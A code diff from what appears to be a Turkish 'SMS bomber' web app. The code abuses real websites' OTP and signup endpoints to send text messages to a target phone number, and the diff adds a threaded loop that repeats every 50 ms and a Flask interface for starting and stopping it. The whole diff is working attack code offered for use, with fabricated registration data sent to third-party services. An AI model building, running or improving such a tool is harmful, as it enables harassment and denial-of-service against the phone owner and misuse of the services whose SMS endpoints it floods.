             if r.json()["resultType"] == 0:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # alixavien.com.tr
     def Alixavien(self):
         try:
             url = "https://www.alixavien.com.tr:443/api/member/sendOtp"
@@ -565,24 +564,24 @@ class SendSms:
             json={"Phone": self.phone, "XID": ""}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["isError"] == False:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
-    # jimmykey.com
     def Jimmykey(self):
         try:
             r = requests.post(f"https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms?gsm={self.phone}&gRecaptchaResponse=undefined", timeout=6)
             if r.json()["Sonuc"] == True:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
         
-    # api.ido.com.tr
     def Ido(self):
         try:
             url = "https://api.ido.com.tr:443/idows/v2/register"
@@ -590,21 +589,110 @@ class SendSms:
             json={"birthDate": True, "captcha": "", "checkPwd": "313131", "code": "", "day": 24, "email": self.mail, "emailNewsletter": False, "firstName": "MEMATI", "gender": "MALE", "lastName": "BAS", "mobileNumber": f"0{self.phone}", "month": 9, "pwd": "313131", "smsNewsletter": True, "tckn": self.tc, "termsOfUse": True, "year": 1977}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
-                self.adet += 1
+                with self._lock:
+                    self.adet += 1
             else:
                 raise
         except:
             pass
 
 # ============================================================
-# METOD İSİMLERİNİ AL (Console'daki gibi)
+# ARKA PLAN İŞLEMLERİ (SÜREKLİ ATAK)
 # ============================================================
-def get_api_methods():
-    methods = []
-    for attr in dir(SendSms):
-        if callable(getattr(SendSms, attr)) and not attr.startswith('__'):
-            methods.append(attr)
-    return methods
+class Bombardier:
+    def __init__(self):
+        self.running = False
+        self.threads = []
+        self.sms_instance = None
+        self.total_sent = 0
+        self.success_count = 0
+        self.lock = threading.Lock()
+        self.methods = self._get_methods()
+        
+    def _get_methods(self):
+        methods = []
+        for attr in dir(SendSms):
+            if callable(getattr(SendSms, attr)) and not attr.startswith('__'):
+                methods.append(attr)
+        return methods
+    
+    def start(self, phone, mode='fast'):
+        if self.running:
+            return False
+        self.running = True
+        self.sms_instance = SendSms(phone, "")  # random mail
+        # Her metod için bir thread başlat
+        delay = 0.05 if mode == 'fast' else 1.0  # 50ms hızlı, 1sn yavaş
+        for method_name in self.methods:
+            t = threading.Thread(target=self._worker, args=(method_name, delay), daemon=True)
+            t.start()
+            self.threads.append(t)
+        return True
+    
+    def _worker(self, method_name, delay):
+        while self.running:
+            # Başlangıç adet sayısını al
+            before = self.sms_instance.adet
+            try:
+                getattr(self.sms_instance, method_name)()
+            except:
+                pass
+            after = self.sms_instance.adet
+            if after > before:
+                with self.lock:
+                    self.success_count += (after - before)
+                    self.total_sent += 1  # her çağrıda bir gönderim denemesi
+            else:
+                with self.lock:
+                    self.total_sent += 1
+            time.sleep(delay)
+    
+    def stop(self):
+        self.running = False
+        for t in self.threads:
+            if t.is_alive():
+                t.join(timeout=0.5)
+        self.threads = []
+        return True
+    
+    def get_stats(self):
+        with self.lock:
+            return {
+                'total_sent': self.total_sent,
+                'success': self.success_count,
+                'is_running': self.running,
+                'methods': self.methods
+            }
+
+bombardier = Bombardier()
+
+# ============================================================
+# FLASK ROUTE'LARI
+# ============================================================
+@app.route('/')
+def index():
+    return render_template_string(HTML)
+
+@app.route('/start')
+def start_bomb():
+    number = request.args.get('number', '')
+    number = duzenle(number)
+    if not number:
+        return {'error': 'Geçersiz numara'}, 400
+    mode = request.args.get('mode', 'fast')
+    if bombardier.running:
+        return {'error': 'Zaten çalışıyor'}, 400
+    bombardier.start(number, mode)
+    return {'status': 'started'}
+
+@app.route('/stop')
+def stop_bomb():
+    bombardier.stop()
+    return {'status': 'stopped'}
+
+@app.route('/stats')
+def stats():
+    return jsonify(bombardier.get_stats())
 
 def duzenle(num):
     num = num.replace(" ", "").replace("+", "").replace("-", "")
@@ -614,7 +702,7 @@ def duzenle(num):
     return num if len(num) == 10 and num.isdigit() else None
 
 # ============================================================
-# HTML ŞABLON
+# HTML ŞABLON (SÜREKLİ STATS ÇEKER)
 # ============================================================
 HTML = """
 <!DOCTYPE html>
@@ -656,10 +744,7 @@ HTML = """
         .error{color:#ff0033;text-align:center;font-size:13px;min-height:20px}
         .footer{text-align:center;color:#1a1a1a;font-size:10px;margin-top:15px}
         .api-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:4px;margin-top:10px;max-height:180px;overflow-y:auto;padding-right:4px}
-        .api-item{font-size:9px;padding:4px;border-radius:6px;text-align:center;font-weight:600}
-        .api-success{color:#00ff41;background:rgba(0,255,65,0.06);border:1px solid rgba(0,255,65,0.1)}
-        .api-fail{color:#444;background:rgba(255,255,255,0.02);border:1px solid #1a1a1a}
-        .api-pending{color:#ffaa00;background:rgba(255,170,0,0.05);border:1px solid rgba(255,170,0,0.1)}
+        .api-item{font-size:9px;padding:4px;border-radius:6px;text-align:center;font-weight:600;color:#444;border:1px solid #1a1a1a}
         @media (max-width:480px){.api-grid{grid-template-columns:1fr 1fr}}
     </style>
 </head>
@@ -669,16 +754,16 @@ HTML = """
     <div class="menu-dropdown" id="menuDropdown">
         <div class="menu-item">
             <input type="radio" name="mode" value="fast" id="modeFast" checked>
-            <label for="modeFast">🚀 Hızlı (100ms)</label>
+            <label for="modeFast">🚀 Hızlı (50ms)</label>
         </div>
         <div class="menu-item">
             <input type="radio" name="mode" value="slow" id="modeSlow">
-            <label for="modeSlow">🐢 Yavaş (2s)</label>
+            <label for="modeSlow">🐢 Yavaş (1sn)</label>
         </div>
     </div>
 
     <h1>⚡ WROX#FLEX</h1>
-    <div class="sub">HYPER COMBO BOMBER v8.0 <span id="apiCount">0</span> API</div>
+    <div class="sub">ULTRA FAST BOMBER v9.0</div>
     
     <label>📱 HEDEF NUMARA</label>
     <input type="tel" id="number" placeholder="5XXXXXXXXX" maxlength="10">
@@ -703,10 +788,10 @@ HTML = """
 </div>
 
 <script>
-var API_NAMES = """ + str(get_api_methods()) + """;
-var isRunning=false,totalSent=0,totalSuccess=0,targetNumber='',bombTimer=null;
-var apiResults = {};
+var isRunning = false;
+var targetNumber = '';
 var mode = 'fast';
+var statsInterval = null;
 
 function toggleMenu() {
     document.getElementById('menuDropdown').classList.toggle('show');
@@ -717,51 +802,45 @@ document.querySelectorAll('input[name="mode"]').forEach(function(el) {
     });
 });
 
-function updateUI() {
-    document.getElementById('statusText').textContent = isRunning ? '🔥 AKTİF' : '💤 HAZIR';
+function updateUI(stats) {
+    if (!stats) return;
+    document.getElementById('statusText').textContent = stats.is_running ? '🔥 AKTİF' : '💤 HAZIR';
     document.getElementById('targetText').textContent = targetNumber ? '+90'+targetNumber : '-';
-    document.getElementById('totalText').textContent = totalSent;
-    document.getElementById('successText').textContent = totalSuccess;
+    document.getElementById('totalText').textContent = stats.total_sent || 0;
+    document.getElementById('successText').textContent = stats.success || 0;
     var box = document.getElementById('statusBox');
-    box.className = isRunning ? 'status active' : 'status idle';
-    box.textContent = isRunning ? '🔥 +90'+targetNumber+' BOMBALANIYOR ('+mode+')' : '⚡ SİSTEM HAZIR';
-    document.getElementById('startBtn').disabled = isRunning;
-    document.getElementById('stopBtn').disabled = !isRunning;
+    if (stats.is_running) {
+        box.className = 'status active';
+        box.textContent = '🔥 +90'+targetNumber+' BOMBALANIYOR ('+mode+')';
+    } else {
+        box.className = 'status idle';
+        box.textContent = '⚡ SİSTEM HAZIR';
+    }
+    document.getElementById('startBtn').disabled = stats.is_running;
+    document.getElementById('stopBtn').disabled = !stats.is_running;
     
+    // API listesini göster (sadece isimler)
     var grid = document.getElementById('apiGrid');
-    grid.innerHTML = '';
-    API_NAMES.forEach(function(name) {
-        var div = document.createElement('div');
-        var status = apiResults[name] || 'pending';
-        div.className = 'api-item api-'+status;
-        div.textContent = (status === 'success' ? '✅' : status === 'fail' ? '❌' : '⏳') + ' ' + name;
-        grid.appendChild(div);
-    });
-    document.getElementById('apiCount').textContent = API_NAMES.length;
-}
-
-async function bombRound() {
-    if (!isRunning) return;
-    try {
-        var response = await fetch('/bomb?number=' + targetNumber + '&mode=' + mode);
-        var data = await response.json();
-        if (data.error) { document.getElementById('error').textContent = '❌ '+data.error; return; }
-        data.results.forEach(function(item) {
-            apiResults[item.name] = item.success ? 'success' : 'fail';
-            totalSent++;
-            if (item.success) totalSuccess++;
+    if (stats.methods) {
+        grid.innerHTML = '';
+        stats.methods.forEach(function(name) {
+            var div = document.createElement('div');
+            div.className = 'api-item';
+            div.textContent = name;
+            grid.appendChild(div);
         });
-        updateUI();
-    } catch(e) {
-        document.getElementById('error').textContent = '❌ Bağlantı hatası!';
-    }
-    if (isRunning) {
-        var delay = (mode === 'fast') ? 100 : 2000;
-        bombTimer = setTimeout(bombRound, delay);
     }
 }
 
-function startBomb() {
+async function fetchStats() {
+    try {
+        var resp = await fetch('/stats');
+        var data = await resp.json();
+        updateUI(data);
+    } catch(e) {}
+}
+
+async function startBomb() {
     var number = document.getElementById('number').value.trim();
     if (!number || number.length != 10) {
         document.getElementById('error').textContent = '❌ 10 haneli numara girin!';
@@ -769,20 +848,30 @@ function startBomb() {
     }
     document.getElementById('error').textContent = '';
     targetNumber = number;
-    isRunning = true;
-    totalSent = 0;
-    totalSuccess = 0;
-    apiResults = {};
-    API_NAMES.forEach(function(name) { apiResults[name] = 'pending'; });
-    updateUI();
-    bombRound();
+    try {
+        var resp = await fetch('/start?number='+number+'&mode='+mode);
+        var data = await resp.json();
+        if (data.error) {
+            document.getElementById('error').textContent = '❌ '+data.error;
+            return;
+        }
+        if (statsInterval) clearInterval(statsInterval);
+        statsInterval = setInterval(fetchStats, 300);
+        await fetchStats();
+    } catch(e) {
+        document.getElementById('error').textContent = '❌ Bağlantı hatası!';
+    }
 }
 
-function stopBomb() {
-    isRunning = false;
-    if (bombTimer) { clearTimeout(bombTimer); bombTimer = null; }
-    document.getElementById('stopBtn').disabled = true;
-    updateUI();
+async function stopBomb() {
+    try {
+        await fetch('/stop');
+        if (statsInterval) {
+            clearInterval(statsInterval);
+            statsInterval = null;
+        }
+        await fetchStats();
+    } catch(e) {}
 }
 
 document.getElementById('number').addEventListener('keypress', function(e) {
@@ -791,57 +880,13 @@ document.getElementById('number').addEventListener('keypress', function(e) {
 document.getElementById('number').addEventListener('input', function(e) {
     this.value = this.value.replace(/[^0-9]/g, '');
 });
-updateUI();
+
+// Başlangıçta stat al
+fetchStats();
 </script>
 </body>
 </html>
 """
-
-# ============================================================
-# FLASK ROUTE
-# ============================================================
-@app.route('/')
-def index():
-    return render_template_string(HTML)
-
-@app.route('/bomb')
-def bomb():
-    number = request.args.get('number', '')
-    number = duzenle(number)
-    if not number:
-        return {'error': 'Geçersiz numara'}, 400
-
-    mode = request.args.get('mode', 'fast')
-    # Hızlı modda max_workers=40 (API sayısı kadar), yavaşta 10
-    max_workers = 40 if mode == 'fast' else 10
-
-    # Orijinal console'daki gibi random mail oluştur (self.mail constructor'da zaten var)
-    # Ama biz burada her seferinde yeni instance oluşturacağız. Her metot için aynı instance'ı kullanalım.
-    sms_instance = SendSms(number, "")  # mail boş geç, constructor random üretsin.
-
-    # Metot isimlerini al
-    method_names = get_api_methods()
-    results = []
-    
-    # Her metodu paralel çalıştır
-    def run_method(method_name):
-        try:
-            # adet sayacını al
-            before = sms_instance.adet
-            # metodu çağır
-            getattr(sms_instance, method_name)()
-            after = sms_instance.adet
-            return method_name, after > before
-        except Exception:
-            return method_name, False
-
-    with ThreadPoolExecutor(max_workers=max_workers) as executor:
-        future_to_method = {executor.submit(run_method, name): name for name in method_names}
-        for future in as_completed(future_to_method):
-            name, success = future.result()
-            results.append({'name': name, 'success': success})
-
-    return {'results': results}
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=10000, debug=False)
